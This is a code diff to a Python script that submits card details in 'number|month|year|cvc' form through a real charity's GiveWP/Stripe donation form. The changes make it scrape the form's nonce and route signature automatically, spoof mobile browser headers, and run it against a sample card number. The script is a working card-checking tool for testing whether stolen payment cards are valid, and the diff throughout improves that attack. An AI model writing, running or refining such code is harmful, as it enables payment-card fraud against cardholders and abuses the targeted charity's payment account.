@@ -1,11 +1,78 @@
 import requests
+import requests
+from bs4 import BeautifulSoup
+import html
+import re
+from urllib.parse import urlparse, parse_qs
+from faker import Faker
+import random
 def cr(ccx):
     ccx = ccx.strip()
     n, mm, yy, cvc = ccx.split("|")
+
+
     cookies = {
     '__stripe_mid': 'cb088fba-6a38-4d20-b56b-679dfebb9f4e1a49c9',
-    '__stripe_sid': 'bd755eb4-7382-4968-816a-62ca5d36ac9fd2273d',
+    '__stripe_sid': '598dd357-cb61-4775-a2c0-b86ebf818042dbcfb8',
 }
+
+    headers = {
+    'authority': 'charlenesproject.org',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
+    # 'cookie': '__stripe_mid=cb088fba-6a38-4d20-b56b-679dfebb9f4e1a49c9; __stripe_sid=598dd357-cb61-4775-a2c0-b86ebf818042dbcfb8',
+    'referer': 'https://charlenesproject.org/donate',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'iframe',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+}
+
+    params = {
+    'givewp-route': 'donation-form-view',
+    'form-id': '108368',
+    'locale': 'en_GB',
+}
+
+    response = requests.get('https://charlenesproject.org/', params=params, cookies=cookies, headers=headers)    
+    
+
+    html_text = response.text
+
+    id_match = re.search(r'"donationFormId":\s*(\d+)', html_text)
+    if id_match:
+        form_id = id_match.group(1)
+        print("donationFormId:", form_id)
+    else:
+        print("donationFormId not found.")
+
+
+    nonce_match = re.search(r'"donationFormNonce":"(.*?)"', html_text)
+    if nonce_match:
+        form_nonce = nonce_match.group(1)
+        print("donationFormNonce:", form_nonce)
+    else:
+        print("donationFormNonce not found.")
+
+    m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
+    if m:
+        donate_url = html.unescape(m.group(1))
+        parsed = urlparse(donate_url)
+        q = parse_qs(parsed.query)
+
+        sig = q.get("givewp-route-signature", ["Not found"])[0]
+        exp = q.get("givewp-route-signature-expiration", ["Not found"])[0]
+
+        print("Signature:", sig)
+        print("Expiration:", exp)
+    else:
+        print("donateUrl not found")
+    session=requests.Session()
+    
     headers = {
     'authority': 'charlenesproject.org',
     'accept': 'application/json',
@@ -25,9 +92,9 @@ def cr(ccx):
 
     params = {
     'givewp-route': 'donate',
-    'givewp-route-signature': 'c85340597d3c4494dfb99181f8b9da4d',
+    'givewp-route-signature': sig,
     'givewp-route-signature-id': 'givewp-donate',
-    'givewp-route-signature-expiration': '1758732018',
+    'givewp-route-signature-expiration': exp,
 }
 
     files = {
@@ -55,7 +122,7 @@ def cr(ccx):
     'gatewayData[stripeConnectedAccountId]': (None, 'acct_1EimNqFfF71I3G8k'),
 }
 
-    response = requests.post('https://charlenesproject.org/', params=params, cookies=cookies, headers=headers, files=files)
+    response = requests.post('https://charlenesproject.org/', params=params,  headers=headers, files=files)
 
 
 
@@ -126,4 +193,5 @@ def cr(ccx):
         return resp
         
         
-#print(cr("5385460449548478|10|2030|880"))     
+#
+print(cr("5385460449548478|10|2030|880"))     
